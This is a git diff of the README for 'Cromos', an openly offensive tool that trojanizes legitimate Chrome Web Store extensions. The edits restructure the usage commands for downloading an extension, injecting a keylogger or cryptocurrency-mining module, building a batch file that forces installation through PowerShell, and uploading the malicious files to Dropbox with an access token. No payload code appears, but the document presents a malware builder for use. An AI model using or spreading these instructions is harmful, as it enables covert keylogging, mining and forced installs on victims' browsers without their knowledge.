@@ -1,6 +1,6 @@
 # Cromos 
 
-Cromos is a tool for downloading legitimate extensions of the Chrome Web Store and inject codes in the background of the application and more cromos create executable files to force installation via <strong>PowerShell</strong> or <strong>VBScript</strong> for example, and also upload files to dropbox to host the malicious files.
+Cromos is a tool for downloading legitimate extensions of the Chrome Web Store and inject codes in the background of the application and more cromos create executable files to force installation via <strong>PowerShell</strong> for example, and also upload files to dropbox to host the malicious files.
 
   - Download extension
   - Injections
@@ -23,10 +23,22 @@ $ sudo chmod -R 777 cromos/
 $ cd cromos && python setup.py
 ```
  ### Usage
+ ##### Downloading the extension
  ```
+Usage: python cromos.py --extension {id}
+ ```
+ ##### Downloading the extension and loading module
  
-Usage: python cromos.py --extension {id} --load {keylogger/currency} --build {.bat, .vbs} --token {token}
  ```
+Usage: python cromos.py --extension {id} --load {currency/keylogger}
+```
+ ##### Build a batch file and upload the files in dropbox
+ 
+ ```
+ Usage: python cromos.py --extension {id} --load {keylogger/currency} --build {bat} --token {token}
+ ```
+
+ 
  
 ### Modules
 You can also inject some predefined modules in the background as <strong>keylogger</strong>, <strong>virtual currency</strong>.
